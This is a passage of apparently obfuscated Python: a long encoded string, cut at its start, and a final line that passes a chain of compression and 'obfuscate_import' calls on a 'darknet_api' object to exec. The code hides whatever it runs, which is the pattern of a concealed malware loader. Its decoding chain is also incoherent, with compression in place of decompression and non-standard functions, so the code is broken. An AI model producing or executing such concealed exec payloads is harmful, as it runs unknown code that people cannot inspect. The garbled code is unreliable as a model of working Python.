CaFJFWnFUV3hhTlZkRVNuTmhNSFJVVVZoT1NtSnJTalZaYWtwUFlrZE5lVkp0ZEdsTk1HeHdWREpzUW1GV1NsWlVWMnh0VlZjNVMxbFhNVWRsVld4RlRVZGthbUpXV2pSYVJtUlhaVzFTU1ZSWVZscE5hbXd5V1ZSS2MySkhUalZPVms1aFYwVlplRmRzYUU5TlIwMTNWRzVhYVUxdVVuZFhiRlozWVVkT2NGb3pRa1JhTW5nMlYyeG9UMlZ0UmxoUFdGWktVa1JDYmxreU1WZGxSMUpZVm01d2ExTkZNVEZXVkVwWFpXMU5lV0pJV21saFYyUjNVVEprYzAweGNGaFRWMlJSVlRCS05sZHNhRTlsYlVaWVQxaFdUV0pyU2pKWmVrNVNZakpTV1ZOdVRrMVNNbWh6VjFaa1UySkhUblZVVkd4b1VqRmFiMWRyWkZkbFZYaElWVzFvYTFJd1ZUVlhhMlJIVFVac1ZHVkhhR2xTTTJneVdrUkZOV1ZXY0ZoVmJrSnFZbFphY1ZwRmFFNVBWbHBKVTJwR1lWVXlkRXhSTVdoRFlVWnZlVlpYWkZGVk1FbzJXa1ZvU21JeVVYbFdiV3hOWW14S2MxcFZhRkpqUlU1dVlrUkNhVTF1VW5OWmJXeENUMVZzU0ZwSGVHdFNhbXQzV1dwS01HSkhTbkJoU0dSYVZqSlNjMVJGVGtwa01HeHdaREpzVTFKVldsVlZNRTVLWTBWT2JtSkljR0ZXTURSM1dXcEtNR0pIU25CUlZHeEtVakpTYzFwRldUVk5SMGw1WkVkNGFXRlhhRE5YVm1ScllrVjRSRk5ZYUVwaFdHUndWV3RXUjFaR1RrUlRXRUpFV2pKMGNWa3dhRXRqUjBwMVZWYzVhMUo2YkhsWGJHTXdZMFZPYm1FeWNHcFRSWEIzV1cwMVVtSXlUWGxXYlhCclVucHNlVmRzWXpCalJVNXVZakJ3YTFkRmNIcFVWazVDVDFWc1NHVklRbWxpV0U1dVV6TnNRbUZWZDNsVWJrNWFWako0TUZSSE5VTmlNazVGVDFkd2FVMXRlREZWUmxaVFVXeFZkMW95YkVSYU1uZ3pWMVpvYzJNeVNYbFNiWFJPVlRCRk5WTlZhSHBoVm10NVQxaENhV0ZWYXpKVFYzUlRVV3hWZDFveWJHMVZWemxMV1ZWa1YyRkdjRWhXYm14T1ZUQkZOVk5WYUhwaFYxSlpWRzE0YW1GVVJtOVhha3BYWkZkU1JGTlVXbXRYUlRWeldUSjNOV0ZHYjNsV2JsWnJVMFJDVEZFeFpGTmhSMUpJVWxob1NsSkVRbTVhV0d4TFVsWkdWMVJyYkd0U2VteDVWMnhqTVdWc2NGaFVha1pxWVZWck1sbDZUbE5sVlhSSlZHMTRXazB4U2pKWlZFcFhaRlYwV1UxRmRFUldNMEp2V1RKck1XVnNjRmxWVnpsS1lURktRMVpVUW05V1YwbDVaRWQ0YVdGVmJIcFplazVUWlZWMFNWVnVXbWhOYkZveFV6Rk9jbE13VGxoalIyaHFZVlJXTmxkc2FGSmlNR3h6VTIxNFlXRlZiSHBUVjNSWFVrVjRWMVp1Y0dGWFJYQkxWMnROZDAwd05YRlNWRkpRVlRCc2QxRXlaSFpUYlZGNVZtMXNTbEpFUW01WmVrcFhaVzFOZVdKSVdtbGhWRll6V1dwT1QwMUZkRWxXYm14cFVrVldlbGxWWkZkaFJuQklWbTVzVGxVemFISlhWbWhUWVVVeFZHVklaRnBYUlhCdldXeG9UazlYVGtoU2FsWnBVbnBzYjFkclVrWmpNV3Q1VDFoYWFFMXRlSE5aTTI5NFkxWnNXVk5ZVGxwV00yaDZXV3BPYTFwdFRuUldiWFJvVjBWd2MxZFVUbE5sYkVKWFZXNXNhMVl4Vm5kUk1tUnpaREZzV0ZwSGVFcFNSRUp1V1hwT1UyVlZkRVpUYlhoYVYwWlpkMWxXWkdGTlYwcEhWRzVhYTFkRlJuWmFSRXBYWVZWNGRWVnRlR3hUUmtaNlUxY3hiMDFIU2xoa00xWnFVakJhTlZsNlNsZGxWV3h3WVROQ1JGb3llSEJYVm1RMFlVZEtkRlJ0ZUVwU1JFSnVWMnBLVjAxR1ozbFRiV2hwVWpCYU1WZFVTbFppTWs1SVVtMDFZVlV6WkhCVmExWkhWa1pPUkZOWVFrUmFNbmd6V1RJeGMyUlhVa1JoU0hCclUwVnNkbGRYTVVkak1XeFlUbGR3WVZVeWRIZFJNbVIzWVRGd1dGZFhaRnBOYm1odldWWmplRnB0VVhsU2FrcGhWMFV4ZGxsclpITmtWMFkxWlVSR2FrMXNXalZYUkVwSFlteHdXRTVVUWsxVFJsbzJWMnhvUzFwdFJsaFZXRUpRV2pJNVMxbFZaRmRoUm5CSVZtNXNTbEpFUW01YVdHeExUVmROZVZadWJFMVdNRnAxVjJ4ak1VMUZiSEZqU0hCclUwVnNkbHBHYUU5aVIwNXpUMWRvWVUxc1dqRmFSVTV6VDFWT2JtSkVSbXBpV0dSdVZVWk9RMk15UmxoT1dFcEtVVE5PYmxOWGF6Vk5iSEJaVTI1Q1lXSnRkREZaTUdSdlpEQnNibUl3Y0dGU01GbDNWMVpPUWs5VmJFbGpNbXhhVFRGYU5Wa3lNVmRrVm10NllUSnNVR0ZWUm5CV2FrSkhWakZLVjFSWGJFcFJNMlJ3VjFaa1UyRXlUblJXYm5CcVpWVnJNbE5WYUU5TlIwNXdZVVJHYWsxc1dqVlhSRXB6WVRCMFZGRllUa3BpYTBvMVdXcEtUMkpIVFhsU2JYUnBUVEJzY0ZReWJFSmhWa3BXVkZkc2JWVlhPVXRaVnpGSFpWVnNSVTFIWkdwaVZsbzBXa1prVjJWdFVrbFVXRlphVFdwc01sbFVTbk5pUjA0MVRsWk9ZVmRGV1hoWGJHaFBUVWROZDFSdVdtbE5ibEozVjJ4V2QyRkhUbkJhTTBKRVdqSjRObGRzYUU5bGJVWllUMWhXU2xKRVFtNVpNakZYWlVkU1dGWnVjR3RUUlRFeFZsUktWMlZ0VFhsaVNGcHBZVmRrZDFFeVpITk5NWEJZVTFka1VWVXdTalpYYkdoUFpXMUdXRTlZVmsxaWEwb3lXWHBPVW1JeVVsbFRiazVOVWpKb2MxZFdaRk5pUjA1MVZGUnNhRkl4V205WGEyUlhaVlY0U0ZWdGFHdFNNRlUxVjJ0a1IwMUdiRlJsUjJocFVqTm9NbHBFUlRWbFZuQllWVzVDYW1KV1duRmFSV2hPVDFaYVNWTnFSbUZWTW5STVVURm9RMkZHYjNsV1YyUlJWVEJLTmxwRmFFcGlNbEY1Vm0xc1RXSnNTbk5hVldoU1kwVk9ibUpFUW1sTmJsSnpXVzFzUWs5VmJFaGFSM2hyVW1wcmQxbHFTakJpUjBwd1lVaGtXbFl5VW5OVVJVNUtaREJzY0dReWJGZE5SVnBZVld4YVRtRlZkRkppTUhCcVRXeGFjVnBGWXpWamJIQllUa2RrVVZVd1NuVlhiR2hUV20xU1NFOVlTbUZXZWxKMldUQmtSMkpzY0ZSa01teE9WVEJzZWxOWGVHdFJiRnB5Vm14U1NtRlhkRXhSTVU1UFpESk9kR0pJVm10Uk1tZDNXV3BLTUdKSFNuQmhNSFJFVlRBMU0xa3lNWE5rVjFKRVlVaHdZVll3TkhkWmFrb3dZa2RLY0dFd2RFUmFNbmQ0V1RJeE0yVkZiRVZOUjJScFVqSjRNVmxZYkVKamEyeEVVMWhhV2sxdWFHOVpWbU4zWkZkT1NHRklaRkZOYXpVeVdWWmpNRTlXV1hkU2JHUlRWbXN4Y0ZFeVpITmtNV3haWWtoT2FVMXJXbkpVVms1Q1QxVnNTV015YkZwTmFteDNXVzFzU2s1cmJITmFSVXBYWVRGYVZWTlhOSGRUTUU1WVlVZDRXbFl4U25OWk1uQkdXakZDVkZGcVpFcGliRm8yVjJ4b1NtUkdiRmhhUjNocFlteEdjRlF5TlZkbGJIQlpVMjFhV2xZeVVuTlpiVFZUVDFWT2JtSkhkRnBYUmtwdlZGWk9RazlWYkVsak1teFhUVVZhV0ZWc1drOU5SMGw1WkVkNGFXSnJOWE5YVkU1WFpWVnNjV05JY0d0VFJXeDJXWHBLVjJGdFVraFBXRXBoVm5wU2QxcHNSblpUYlVaMFVtNXNUV0pyTlhOYVJVNXVZVlpaZDFKc1pGTldhelZXV1dwS01HSkhTbkJUV0U1cVRURktOVk13YUZOa2JVVjVWbTVXVEZVeWRFeFJNV1IzWVVkT2NFNVljR0ZYUmtaMlUxZDRTMkpHY0hCVFdFNUtZVEZhUlZSR1dsZGxiSEJaVTJ0d1lWRjZRWHBVYlhCR1RrVTVWRk5ZUWtSYU1qbExXa1JLVjJGVmJFVk5SMlJxVFd4YU5sbDZTbk5rYlVwd1RsaGthVTB3TkhkVE1HaFhaVmRLUlZKWVRtaFNNVnB2VjJ0a1YyVlZNVlJsUjNSYVYwWktiMVJXVGpSa01XeFpVMjFvYVZkRk1EVlpNR1JIVGxkS1NFOVhhR0ZTUlZaNlYxUkpOV1J0UlhsaVIzaHFaV3BHZUZkV2FFcGpNV3hZWlVoT2FVMHlVbTFaTWpGWFlUSkdXVk50ZUZwTk1VbzJWVVphVTJWWFVsaFdXRUpFV2pKNE0xZFdaR3RpUld4RlRVZGthazB4U2pWVE1GWkxZa1pzV1ZacVFtaFdNVzk0V1d0YVQyUnRVbGxSVnpsclRXeGFjRlJITlZOaVIxWkpWVmhPU21KWFozZFpiR1F6WkZkT1NGSnViR3BOYkZvMVUxZHNjbU5GVG01aVIyeGFWak5vYjFsdE1VOWlSV3hGVFVka1lVMXNXWGRYUkVwTFlVZEtTRkp1VmxwTmJGWjJXVEJrUjJKc2NGUmtNbXhYVFVWYVdGVnNXazVoVlhSU1lqQndhbE5GY0hkWmJUVlNZakpOZWxWdWJFeFNNSEJ2V1d0a1IyUldhM2xXV0VKTVZWYzVURmRyWkZkaVZXeElWRzVPV2xZeWVEQlVWazV1WTBVNWJtSXdjR3RYUlRWeldUSjNOV0ZHYjNsV2JsWnJVVEJGTlZOVlpHdGlSMUpIVDFSR1dsVXlaSGRSTW1SelRUSkdTR0pJVG1GVk1FcFdXVEkxVjJKRk9XNWlNSEJFVmpBMWVsZFdaSE5rUm1kNVZXNWFZVTFzVm5aYVJtaERZVEZzV1ZWdGVGbE5ibWgzV1cweGVtSXdiSEpWYkVKVFRVWldjRk14VGpSTlYwMTVWbTVzV1UxclduVlhiR014VFVWNFNWWnVjR0ZYUlhCdFdWWmtVbU5GVG01aE1IQmFUVzVvYjFsV1kzaGFiR3gwVkc1V1RGTkdXak5YYTJSSFRVWndWMDlZVG1oV2VsWjVVekJPUzFFeFJYZE9SMnhNVlRObmVGbDZTbGRsVm1kNVVtMDFZVlo2VlhkVVJXaFhaV3h3V1ZOdFdtaFdNVVozVVRKa2NsTnNhM2xsUjJob1ZucEdiVnBGYUV0T1JYUkpWbTVrWVZJd1dYZFhiRmsxWXpKR1dFNVlTa3hSTUhCV1ZsZDRibUZWZEZSbFJFWnFUV3hhTlZkRVNrZGliSEJZVGxSQ1RWTkdXalpYYkdoTFdtMUdXRlZZUWtSYU1uUkxWMVJLTkdGSFJsaE5WMXBwVTBaS2NWTXdhRmRrTVhCSVVtcENZVlpxYkhwWlZtTXhZMnQwUkZOck1WZFNWVEZ3VXpGT05FMVhUWGxXYm14WlRXdGFkVmRzWXpGTlJYaEpWbTV3WVZkRmNHMVpWbVJTWTBWT2JtRXdjRnBOYm1odldWWmplRnBzYkhSVWJUbE1VMFphTTFkclpFZE5SbkJYVDFoT2FGWjZWbmxUTUU1TFVURkZkMW95YkV4Vk0yZDRXWHBLVjJWV1ozbFNiVFZoVm5wVmQxUkZhRmRsYkhCWlUyMWFhRll4Um5kUk1tUnlVMnhyZVdWSGFHaFdla1p0VjJ0a1IyVnRSa1JoUkVacVVqRktiMXBGWkZkYWJVcElZa2hXYUdWWFpIQlZhMVpIVmtaT1JGTllRazFUUmxvMlYyeG9TMXBzYkZoYVIzaHBZbXhHZWxwR2FFOWlSMDV6VDFoQ1lWRXlkRXhSTVVaellXMUtTRkp1UW1sV2FtdDZWMVpvWVdKSFRqVmhSRVpxVWpGS2IxcEZaRmRhYlVwSVlraFdhR1ZYWkhCV2FrSkhWakZLVjFSWGJFeFZNMmQ0V1hwS1YyVldaM2xTYlRWaFZucFZkMVJGYUZkbGJIQlpVMjFhYUZZeFJuZFJNakZoWkcxT2NGRnRXa3BTTW5neFUxVm9TMkZIU25SYVIzaE1Vako0TVZwRlRtOU5WMDE1Vm01c1dVMHhTblpaTWpGWFlVWndSR0V6UWxCYU1qbExWMVJLTkdGSFJsaE5TR2hLVWtSQ2JscEZaRzlsVm5CWVVtMTBhRlo2Vm5WVVIzaFRZakpPZEZadGFHRlJNbWQzVjFab1MySnNjRmxWVkd4YVRXNW9iMWxXWTNkbFJYUlNZakJ3V2sxdWFHOVpWbU4zWlVWNGRWUnFRbHBYUlc5M1V6Qk9jbEJSUFQwPQ==";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))